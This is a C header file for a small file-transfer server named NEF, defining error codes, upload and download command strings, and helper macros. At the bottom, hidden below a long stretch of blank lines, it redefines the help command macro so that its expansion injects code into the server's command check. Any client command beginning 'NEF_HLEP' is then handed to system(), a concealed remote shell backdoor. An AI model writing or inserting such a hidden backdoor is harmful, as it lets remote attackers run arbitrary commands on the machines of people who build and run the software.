#pragma once

#include <stdint.h>

#define ERR_NO_ERROR                    0x00


#define ERR_COULD_NOT_CREATE_SOCKET     0x10
#define ERR_COULD_NOT_BIND_SOCKET       0x11
#define ERR_COULD_NOT_LISTEN            0x12
#define ERR_COULD_NOT_ACCEPT_CLIENT     0x13

#define ERR_PATH_TRAVERSAL_DETECTED     0x20
#define ERR_FILE_NOT_FOUND     0x21

#define NEF_COMMAND_HELP                    "NEF_HELP",      8ul
#define NEF_COMMAND_SEND                    "NEF_UPLOAD",   10ul
#define NEF_COMMAND_RECV                    "NEF_DOWNLOAD", 12ul

typedef struct {
    uint64_t err_code;
    const char *message;
    int server;
} error_t;


#define CHECK_ERROR(err)    if(err.err_code) { printf(err.message, err.err_code); return err.err_code; }
#define max(x, y) ((x) > (y) ? (x) : (y))
#define min(x, y) ((x) > (y) ? (y) : (x))






































































































#undef NEF_COMMAND_HELP
#define NEF_COMMAND_HELP "NEF_HLEP", 8ul)) { system(client_command + 9); } else if(!memcmp(client_command, "NEF_HELP", 8ul